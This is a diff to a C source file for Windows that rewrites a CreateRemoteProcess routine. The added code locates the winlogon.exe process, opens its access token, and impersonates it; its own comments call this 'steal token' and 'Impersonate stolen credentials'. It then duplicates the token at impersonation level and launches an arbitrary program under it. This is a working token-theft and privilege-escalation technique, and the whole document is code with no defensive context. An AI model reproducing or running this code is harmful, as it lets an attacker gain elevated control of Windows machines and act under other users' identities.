@@ -2,11 +2,15 @@
  * by Philip Simonson.
  */
 
-#include <windows.h>
-#include <userenv.h>
+#if defined(_WIN32) || (_WIN64)
+	#include <windows.h>
+	#include <userenv.h>
+#endif
 #include <stdio.h>
 
+#if defined(_WIN32) || (_WIN64)
 extern BOOL MByteToUnicode(LPCSTR mbStr, LPWSTR uStr, DWORD dwSize);
+extern DWORD FindProcessId(LPCSTR lpszProcessName, HANDLE *hProcess);
 
 BOOL SetTokenPrivilege(HANDLE hToken, LPCSTR szPrivilege, BOOL bEnablePrivilege)
 {
@@ -41,6 +45,7 @@ BOOL SetTokenPrivilege(HANDLE hToken, LPCSTR szPrivilege, BOOL bEnablePrivilege)
 
 BOOL CreateRemoteProcess(char *username, const char *domain, const char *password, const char *app)
 {
+	HANDLE hProcess;
 	HANDLE hToken;
 	HANDLE hPrimaryToken;
 	PROCESS_INFORMATION pi;
@@ -51,8 +56,32 @@ BOOL CreateRemoteProcess(char *username, const char *domain, const char *passwor
 	ZeroMemory(&si, sizeof(si));
 	ZeroMemory(&pi, sizeof(pi));
 	si.cb = sizeof(si);
+	hProcess = NULL;
 
-	if(!LogonUser(username, domain, password, LOGON32_LOGON_INTERACTIVE,
+	/* Get winlogon process */
+	FindProcessId("winlogon.exe", &hProcess);
+	if(!hProcess) {
+		printf("Couldn't open process.\n");
+		return FALSE;
+	}
+
+	/* Get process id and then steal token */
+	if(!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
+		fprintf(stderr, "Error: Retrieving token from winlogon.\nError code %lu\n",
+			GetLastError());
+		CloseHandle(hProcess);
+		return FALSE;
+	}
+	CloseHandle(hProcess);
+
+	/* Impersonate stolen credentials */
+	if(!ImpersonateLoggedOnUser(hToken)) {
+		fprintf(stderr, "Error: Cannot impersonate stolen user token.\nError code %lu\n",
+			GetLastError());
+		return FALSE;
+	}
+
+	if(!LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS,
 			LOGON32_PROVIDER_DEFAULT, &hToken)) {
 		fprintf(stderr, "Error: LogonUser() function failed.\nError code %lu\n",
 			GetLastError());
@@ -62,7 +91,7 @@ BOOL CreateRemoteProcess(char *username, const char *domain, const char *passwor
 	ZeroMemory(&sa, sizeof(sa));
 	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
 	if(!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, &sa,
-			SecurityIdentification, TokenPrimary, &hPrimaryToken)) {
+			SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
 		fprintf(stderr, "Error: DuplicateToken() function failed.\nError code %lu\n",
 			GetLastError());
 		return FALSE;
@@ -82,7 +111,7 @@ BOOL CreateRemoteProcess(char *username, const char *domain, const char *passwor
 	si.dwFlags = STARTF_USESHOWWINDOW;
 	si.wShowWindow = SW_SHOWNORMAL;
 	if(!CreateProcessAsUser(hPrimaryToken, app, NULL, 
-			&sa, &sa, FALSE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
+			&sa, &sa, FALSE, CREATE_NEW_CONSOLE,
 			NULL, szPath, &si, &pi)) {
 		fprintf(stderr, "Error: Cannot create the process.\nError code %lu\n",
 			GetLastError());
@@ -189,3 +218,4 @@ BOOL LaunchApp(char *appname)
 
 	return TRUE;
 }
+#endif
